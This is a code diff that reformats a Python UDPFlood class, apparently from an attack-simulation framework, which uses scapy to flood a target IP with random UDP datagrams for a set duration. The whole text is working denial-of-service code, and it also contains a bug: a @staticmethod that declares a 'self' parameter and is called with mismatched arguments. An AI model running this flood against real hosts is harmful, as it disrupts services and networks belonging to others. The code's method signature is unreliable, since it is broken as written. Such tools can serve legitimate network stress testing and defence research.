@@ -28,31 +28,35 @@ from scapy.all import IP, UDP, Raw, RandShort, send
 
 from attacks.attack import Attack
 
+
 class UDPFlood(Attack):
     """Send a continuous stream of random UDP datagrams to the victim."""
 
     _MAX_SIZE = 1500  # stay below common Ethernet MTU
     # ------------------------------------------------------------------ #
+
     def execute(self) -> None:
         self.wait_until_start()
 
-        port      = int(self.parameters.get("target_port", 53))
-        duration  = int(self.parameters.get("duration", 10))
-        payload_n = min(int(self.parameters.get("packet_size", 512)),self._MAX_SIZE)
+        port = int(self.parameters.get("target_port", 53))
+        duration = int(self.parameters.get("duration", 10))
+        payload_n = min(int(self.parameters.get(
+            "packet_size", 512)), self._MAX_SIZE)
 
         self._udp_flood(self.target_ip, port, duration, payload_n)
 
     # ------------------------------------------------------------------ #
     @staticmethod
-    def _udp_flood(self,target_ip: str,fixed_port: Optional[int],duration: int,size: int) -> None:
+    def _udp_flood(self, target_ip: str, fixed_port: Optional[int], duration: int, size: int) -> None:
         """
         Transmit UDP datagrams for *duration* seconds.
         The payload is a static random byte-string to avoid repeated allocation overhead.
         """
-        payload  = Raw(bytes(random.getrandbits(8) for _ in range(size)))
+        payload = Raw(bytes(random.getrandbits(8) for _ in range(size)))
         end_time = time.time() + duration
 
         while time.time() < end_time:
             dport = fixed_port if fixed_port is not None else RandShort()
-            packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=dport) / payload
+            packet = IP(dst=target_ip) / \
+                UDP(sport=RandShort(), dport=dport) / payload
             send(packet, verbose=0)
